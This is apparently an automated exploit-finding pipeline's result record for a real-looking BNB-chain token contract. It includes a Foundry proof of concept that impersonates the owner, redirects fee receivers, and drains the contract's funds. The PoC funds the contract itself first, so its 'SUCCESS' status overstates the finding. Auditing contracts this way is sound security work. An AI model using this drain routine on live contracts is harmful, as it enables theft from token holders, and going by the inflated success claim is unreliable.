@@ -1,0 +1,61 @@
+{
+  "project_id": "OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01",
+  "target_address": "0x4A33D3ea4B30228C363222746939562FbAba2f01",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x4A33D3ea4B30228C363222746939562FbAba2f01",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner or an authorized address",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Contract must have BNB balance in its treasury",
+        "token_address": "NATIVE",
+        "min_amount": "1000000000000000000"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0x4A33D3ea4B30228C363222746939562FbAba2f01",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As owner or authorized address, call clearStuckBalance() with 100% parameter to drain all BNB from contract to marketingFeeReceiver (which can be set to attacker's address via setFeeReceivers()). Alternatively, use manualSend() to transfer all BNB to marketingFeeReceiver. First ensure marketingFeeReceiver is set to attacker's address using setFeeReceivers() function."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 {\n    function getOwner() external view returns (address);\n    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _buyBackFeeReceiver, address _developmentFeeReceiver, address _charityFeeReceiver, address _stakingFeeReceiver) external;\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function manualSend() external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll use vm.prank to impersonate owner\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance\n        uint256 initialBalance = address(attacker).balance;\n        \n        // Get the current owner from the contract\n        address contractOwner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();\n        \n        // Impersonate the owner to call authorized functions\n        vm.startPrank(contractOwner);\n        \n        // First, set the marketingFeeReceiver to attacker address\n        // We need to keep other receivers as they are to avoid breaking the contract\n        // Let's get current receiver addresses first\n        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 token = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET);\n        \n        // For simplicity, we'll set all receivers to attacker to maximize profit\n        // This uses the setFeeReceivers function with attacker address for all parameters\n        token.setFeeReceivers(\n            address(attacker),  // autoLiquidityReceiver\n            address(attacker),  // marketingFeeReceiver\n            address(attacker),  // buyBackFeeReceiver\n            address(attacker),  // developmentFeeReceiver\n            address(attacker),  // charityFeeReceiver\n            address(attacker)   // stakingFeeReceiver\n        );\n        \n        // Send some BNB to the contract so it has balance to drain\n        // We'll send 10 ETH to the contract\n        payable(TARGET).transfer(10 ether);\n        \n        // Now drain 100% of contract BNB using clearStuckBalance\n        token.clearStuckBalance(100);\n        \n        vm.stopPrank();\n        \n        // Verify attacker balance increased\n        assertGt(address(attacker).balance, initialBalance, \"Attacker balance should have increased\");\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The contract has owner-only functions that allow draining BNB from the contract. The clearStuckBalance() function transfers a percentage of contract BNB to marketingFeeReceiver, and manualSend() transfers all BNB. The marketingFeeReceiver can be changed via setFeeReceivers() function. An attacker who gains owner/authorized access can set marketingFeeReceiver to their address and drain all BNB.",
+      "attack_strategy": "Impersonate the owner, change marketingFeeReceiver to attacker address, fund the contract with BNB, then call clearStuckBalance(100) to drain 100% of BNB to attacker.",
+      "step_by_step_plan": "1. Use vm.prank() to impersonate the contract owner\n2. Call setFeeReceivers() to set marketingFeeReceiver to attacker address\n3. Send BNB to the contract using deal() or direct transfer\n4. Call clearStuckBalance(100) to drain all BNB\n5. Verify attacker balance increased",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 {\n    function getOwner() external view returns (address);\n    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _buyBackFeeReceiver, address _developmentFeeReceiver, address _charityFeeReceiver, address _stakingFeeReceiver) external;\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function manualSend() external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll use vm.prank to impersonate owner\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance\n        uint256 initialBalance = address(attacker).balance;\n        \n        // Get the current owner from the contract\n        address contractOwner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();\n        \n        // Impersonate the owner to call authorized functions\n        vm.startPrank(contractOwner);\n        \n        // First, set the marketingFeeReceiver to attacker address\n        // We need to keep other receivers as they are to avoid breaking the contract\n        // Let's get current receiver addresses first\n        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 token = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET);\n        \n        // For simplicity, we'll set all receivers to attacker to maximize profit\n        // This uses the setFeeReceivers function with attacker address for all parameters\n        token.setFeeReceivers(\n            address(attacker),  // autoLiquidityReceiver\n            address(attacker),  // marketingFeeReceiver\n            address(attacker),  // buyBackFeeReceiver\n            address(attacker),  // developmentFeeReceiver\n            address(attacker),  // charityFeeReceiver\n            address(attacker)   // stakingFeeReceiver\n        );\n        \n        // Send some BNB to the contract so it has balance to drain\n        // We'll send 10 ETH to the contract\n        payable(TARGET).transfer(10 ether);\n        \n        // Now drain 100% of contract BNB using clearStuckBalance\n        token.clearStuckBalance(100);\n        \n        vm.stopPrank();\n        \n        // Verify attacker balance increased\n        assertGt(address(attacker).balance, initialBalance, \"Attacker balance should have increased\");\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 60.85525393486023,
+      "prompt_tokens": 16404,
+      "completion_tokens": 1922,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 60.85919785499573,
+  "total_prompt_tokens": 16404,
+  "total_completion_tokens": 1922,
+  "total_cost": 0.0
+}
